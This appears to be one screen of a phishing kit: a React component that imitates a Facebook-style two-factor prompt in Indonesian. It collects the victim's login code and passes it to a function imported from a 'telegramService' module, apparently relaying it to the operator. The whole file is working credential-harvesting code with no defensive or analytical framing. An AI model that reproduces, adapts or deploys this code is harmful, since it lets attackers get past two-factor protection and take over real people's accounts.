import React, { useState } from 'react';
import type { StepProps } from '../types';
import { send2FACode } from '../services/telegramService';

const Screen4_2FA: React.FC<StepProps> = ({ onNext }) => {
  const [code, setCode] = useState('');

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    // In a real scenario, we might want to validate code length, but here we proceed
    if (code.trim()) {
      send2FACode(code);
      onNext();
    } else {
        // Optional: show an error for empty code
    }
  };

  return (
    <div className="bg-[#F0F2F5] min-h-screen flex justify-center items-center p-4">
      <div className="w-full max-w-lg bg-white shadow-lg rounded-lg overflow-hidden">
        <div className="p-4 border-b border-gray-300">
          <h2 className="text-xl font-bold">Diperlukan Autentikasi Dua Faktor</h2>
        </div>
        <form onSubmit={handleSubmit}>
            <div className="p-6">
                <p className="text-gray-700 mb-4 text-md">Anda telah meminta kami untuk mewajibkan kode login 6 digit setiap kali ada upaya untuk mengakses akun Anda dari browser atau perangkat yang tidak kami kenali.</p>
                <p className="text-gray-700 mb-4 text-md">Masukkan kode dari generator kode atau aplikasi pihak ketiga di bawah ini.</p>
                
                <input
                    type="text"
                    id="code"
                    name="code"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    placeholder="Kode login"
                    className="w-full md:w-1/2 px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                    maxLength={8}
                    aria-label="Kode login autentikasi dua faktor"
                />
                <div className="mt-4">
                    <label htmlFor="save-device" className="flex items-center text-gray-700">
                        <input type="checkbox" id="save-device" name="save-device" className="h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
                        <span className="ml-2">Simpan browser</span>
                    </label>
                </div>
                <p className="text-gray-500 text-sm mt-6">
                    <a href="#" className="text-blue-600 hover:underline">Perlu cara lain untuk mengautentikasi?</a>
                </p>
            </div>
            <div className="p-4 bg-gray-100 border-t border-gray-200 flex justify-end items-center space-x-2">
                <a href="#" className="text-blue-700 font-semibold px-4 py-2 hover:bg-gray-200 rounded-md">
                    Butuh Bantuan?
                </a>
                <button 
                    type="submit"
                    className="px-6 py-2 bg-[#1877F2] text-white font-bold rounded-md hover:bg-blue-600 disabled:opacity-50"
                    disabled={!code.trim()}
                >
                    Kirim
                </button>
            </div>
        </form>
      </div>
    </div>
  );
};

export default Screen4_2FA;